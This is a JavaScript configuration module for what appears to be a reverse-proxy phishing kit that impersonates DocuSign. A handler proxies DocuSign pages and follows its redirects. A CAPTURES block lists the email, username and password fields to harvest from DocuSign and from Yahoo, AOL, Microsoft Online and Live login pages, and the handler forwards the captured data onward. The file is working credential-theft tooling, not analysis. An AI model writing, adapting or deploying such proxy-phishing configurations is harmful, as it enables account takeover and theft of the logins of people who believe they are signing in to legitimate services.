/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */

const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        if (this.req.url.startsWith('/v3/home')  || this.req.url.startsWith('/v3/Media/Manage')) {
            super.sendClientData(clientContext, {})
        }


        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(JSON.stringify(redirectToken))

            if (redirectToken.obj.host === 'app.docusign.com') {
                clientContext.currentDomain = 'app.docusign.com'
            }

            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

       

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}







const configExport = {
    SCHEME: 'docusign',

    CURRENT_DOMAIN: 'account.docusign.com',

    START_PATH: '/',

    COOKIE_PATH: ['/authentication', '/_settings', '/'],


    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['email'],
            urls: [],
            hosts: ['account.docusign.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: [],
            hosts: ['account.docusign.com'],
        },

        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: [],
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: [],
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },


    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

